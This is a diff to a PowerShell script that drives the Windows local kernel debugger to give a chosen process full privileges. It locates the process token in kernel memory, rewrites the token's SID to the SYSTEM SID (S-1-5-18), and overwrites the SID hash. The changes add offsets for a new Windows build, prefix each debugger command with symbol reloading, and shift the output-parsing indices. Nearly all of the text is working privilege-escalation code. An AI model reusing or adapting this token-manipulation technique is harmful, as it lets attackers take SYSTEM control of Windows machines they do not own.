@@ -94,7 +94,7 @@ Knowing these few facts we could:
 2. copy the contents (not the address!) of the SID 
 3. copy the contents of the SidHash 
 #>
-
+$symfix = ""
 Switch ($mode) {
     "1" { 
             $offset = "208"
@@ -123,11 +123,20 @@ Switch ($mode) {
             #   +0x2f0 ActiveProcessLinks : _LIST_ENTRY
             $activeProcessLinksOffset = "0x2f0"
         }
+    "1014342" {
+            $offset = "358"
+            $sidHashOffset = "+0x0e8+0x010"
+            #   +0x2f0 ActiveProcessLinks : _LIST_ENTRY
+            $activeProcessLinksOffset = "0x2f0"
+            $symfix = ".symfix
+.reload /f nt"
+    }
 }
 
 Write-Output "Trying to give full privileges to the process $Process"
 
-$chain = "!process 0 0 $Process"
+$chain = "$symfix
+!process 0 0 $Process"
 Write-InFile $buffer "$chain"
 $tabSystem = Call-MemoryWalker $kd $file $fullScriptPath $symbols
 $tabFA = ($tabSystem -split ' ')                   
@@ -135,7 +144,8 @@ $fi = [array]::indexof($tabFA,"PROCESS") + 1
 $processAddress = $tabFA[$fi]
 Write-Output "$Process memory address found!"
 
-$chain =  "dq $processAddress+$offset L1"
+$chain =  "$symfix
+dq $processAddress+$offset L1"
 Write-InFile $buffer "$chain"
 $tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols
 $tabFA = ($tabOffset -split ' ')                
@@ -143,54 +153,61 @@ $fi = [array]::indexof($tabFA,"L1") + 3
 $processTokenAddress = $tabFA[$fi] -replace "``", ""
 Write-Output "$Process token address found!"
 
-$chain = "? $processTokenAddress & fffffffffffffff0"
+$chain = "$symfix
+? $processTokenAddress & fffffffffffffff0"
 Write-InFile $buffer "$chain"
 $tabAnd = Call-MemoryWalker $kd $file $fullScriptPath $symbols
 $tabFA = ($tabAnd -split ' ') 
 $fi = [array]::indexof($tabFA,"fffffffffffffff0") + 5
 $processTokenAddressAnded = $tabFA[$fi] -replace "``", ""
 
-$chain =  "dt -v -b nt!_TOKEN UserAndGroups $processTokenAddressAnded"
+$chain =  "$symfix
+dt -v -b nt!_TOKEN UserAndGroups $processTokenAddressAnded"
 Write-InFile $buffer "$chain"
 $tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols
 $tabFA = ($tabOffset -split ' ')    
-$fi = [array]::indexof($tabFA,"lkd>") + 25
+$fi = [array]::indexof($tabFA,"lkd>") + 31 #25
 $structTOKENAddress = $tabFA[$fi]
-$fi = [array]::indexof($tabFA,"lkd>") + 15
+$fi = [array]::indexof($tabFA,"lkd>") + 21 #15
 $elementsNumber = $tabFA[$fi]
 Write-Output "$elementsNumber elements"
 
-$chain =  "dt -v -b nt!_SID_AND_ATTRIBUTES $structTOKENAddress"
+$chain =  "$symfix
+dt -v -b nt!_SID_AND_ATTRIBUTES $structTOKENAddress"
 Write-InFile $buffer "$chain"
 $tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols
 $tabFA = ($tabOffset -split ' ')    
-$fi = [array]::indexof($tabFA,"lkd>") + 37
+$fi = [array]::indexof($tabFA,"lkd>") + 43 #37
 $structSIDANDATTRIBUTESAddress = $tabFA[$fi]
-$fi = [array]::indexof($tabFA,"lkd>") + 14
+$fi = [array]::indexof($tabFA,"lkd>") + 20 #14
 $elementsNumber = $tabFA[$fi]
 Write-Output "struct _SID_AND_ATTRIBUTES memory address: $structSIDANDATTRIBUTESAddress - $elementsNumber elements"
 
-$chain = "!sid $structSIDANDATTRIBUTESAddress"
+$chain = "$symfix
+!sid $structSIDANDATTRIBUTESAddress"
 Write-InFile $buffer "$chain"
 $tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols
 $tabFA = ($tabOffset -split ' ')    
-$fi = [array]::indexof($tabFA,"lkd>") + 11
+$fi = [array]::indexof($tabFA,"lkd>") + 17 #11
 $sidValue = $tabFA[$fi]
 Write-Output "SID is: $sidValue"
 
 Write-Output "Modifying SID..."
-$chain ="r? `$t0=(_SID*) $structSIDANDATTRIBUTESAddress;??(@`$t0->SubAuthorityCount=1)"
+$chain ="$symfix
+r? `$t0=(_SID*) $structSIDANDATTRIBUTESAddress;??(@`$t0->SubAuthorityCount=1)"
 Write-InFile $buffer "$chain"
 $tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols
-$chain ="r? `$t0=(_SID*) $structSIDANDATTRIBUTESAddress;??(@`$t0->SubAuthority[0]=18)"
+$chain ="$symfix
+r? `$t0=(_SID*) $structSIDANDATTRIBUTESAddress;??(@`$t0->SubAuthority[0]=18)"
 Write-InFile $buffer "$chain"
 $tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols
 
-$chain = "!sid $structSIDANDATTRIBUTESAddress"
+$chain = "$symfix
+!sid $structSIDANDATTRIBUTESAddress"
 Write-InFile $buffer "$chain"
 $tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols
 $tabFA = ($tabOffset -split ' ')    
-$fi = [array]::indexof($tabFA,"lkd>") + 11
+$fi = [array]::indexof($tabFA,"lkd>") + 17 #11
 $sidValue = $tabFA[$fi]
 Write-Output "SID is: $sidValue"
 
@@ -205,22 +222,25 @@ $res = Call-MemoryWalker $kd $file $fullScriptPath $symbols
 Write-Output "Modifying SIDHash..."
 $hashSystem = "0x16 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x01 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x08 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x1c 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x01 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x02 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00"
 $tokenSidHashOffset = "$processTokenAddressAnded$sidHashOffset"
-$chain = ".formats $tokenSidHashOffset"
+$chain = "$symfix
+.formats $tokenSidHashOffset"
 Write-InFile $buffer "$chain"
 $tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols
 $tabFA = ($tabOffset -split ' ')            
-$fi = [array]::indexof($tabFA,"Hex:") + 5
+$fi = [array]::indexof($tabFA,"Hex:") + 11 #5
 $formatTokenSidHashOffset = $tabFA[$fi]
 
-$chain = "f $formatTokenSidHashOffset L100 $hashSystem"
+$chain = "$symfix
+f $formatTokenSidHashOffset L100 $hashSystem"
 Write-InFile $buffer "$chain"
 $res = Call-MemoryWalker $kd $file $fullScriptPath $symbols
 
-$chain = "dt nt!_eprocess ActiveProcessLinks. ImageFileName $processAddress"
+$chain = "$symfix
+dt nt!_eprocess ActiveProcessLinks. ImageFileName $processAddress"
 Write-InFile $buffer "$chain"
 $tabSystem = Call-MemoryWalker $kd $file $fullScriptPath $symbols
 $tabFA = ($tabSystem -split ' ')                   
-$fi = [array]::indexof($tabFA,"[") + 1
+$fi = [array]::indexof($tabFA,"[") + 7 #1
 $processAddress = $tabFA[$fi]
 Write-Output "$Process memory address found!"
 
